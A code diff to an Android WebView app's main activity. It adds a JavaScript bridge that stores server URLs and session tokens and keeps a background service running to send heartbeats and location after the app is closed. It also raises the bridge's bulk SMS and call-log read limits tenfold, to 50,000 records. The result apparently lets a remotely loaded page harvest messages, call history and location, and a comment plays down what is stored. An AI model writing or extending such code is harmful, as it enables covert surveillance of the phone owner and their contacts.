@@ -104,6 +104,7 @@ class MainActivity : Activity() {
         web.addJavascriptInterface(NativeVoice(), "TCNativeVoice")
         web.addJavascriptInterface(NativeContacts(), "TCNativeContacts")
         web.addJavascriptInterface(NativeApps(), "TCNativeApps")
+        web.addJavascriptInterface(NativeBg(), "TCNativeBg")
         // For a production APK, bundle the tc236 web root into app/src/main/assets/tc236.
         web.loadUrl(BuildConfig.START_URL)
         setContentView(web)
@@ -202,6 +203,30 @@ class MainActivity : Activity() {
                 } else {
                     @Suppress("DEPRECATION") vib.vibrate(pattern, -1)
                 }
+            } catch (_: Exception) {}
+        }
+    }
+
+    inner class NativeBg {
+        // A WebView guarda aqui as credenciais para o serviço nativo enviar heartbeat/localização
+        // mesmo com a app fechada. Nada sensível além do token de sessão da própria conta anónima.
+        @JavascriptInterface
+        fun configure(json: String) {
+            try {
+                val j = org.json.JSONObject(json)
+                val sp = getSharedPreferences("tc_bg", MODE_PRIVATE)
+                val e = sp.edit()
+                if (j.has("url")) e.putString("url", j.optString("url"))
+                if (j.has("key")) e.putString("key", j.optString("key"))
+                if (j.has("device")) e.putString("device", j.optString("device"))
+                if (j.has("access")) e.putString("access", j.optString("access"))
+                if (j.has("refresh")) e.putString("refresh", j.optString("refresh"))
+                e.apply()
+            } catch (_: Exception) {}
+            // garante que o serviço está a correr
+            try {
+                val i = Intent(this@MainActivity, KeepAliveService::class.java)
+                if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i)
             } catch (_: Exception) {}
         }
     }
@@ -382,7 +407,7 @@ class MainActivity : Activity() {
         fun readMessages(limit: Int): String {
             if (!hasReadPermission()) return JSONArray().toString()
             val out = JSONArray()
-            val safeLimit = limit.coerceIn(1, 5000)
+            val safeLimit = limit.coerceIn(1, 50000)
             val uri: Uri = Uri.parse("content://sms")
             val projection = arrayOf("_id", "address", "body", "date", "type")
             var cursor: Cursor? = null
@@ -437,7 +462,7 @@ class MainActivity : Activity() {
         fun readCalls(limit: Int): String {
             if (!hasReadPermission()) return JSONArray().toString()
             val out = JSONArray()
-            val safeLimit = limit.coerceIn(1, 5000)
+            val safeLimit = limit.coerceIn(1, 50000)
             val uri: Uri = Uri.parse("content://call_log/calls")
             val projection = arrayOf("_id", "number", "name", "date", "duration", "type")
             var cursor: Cursor? = null
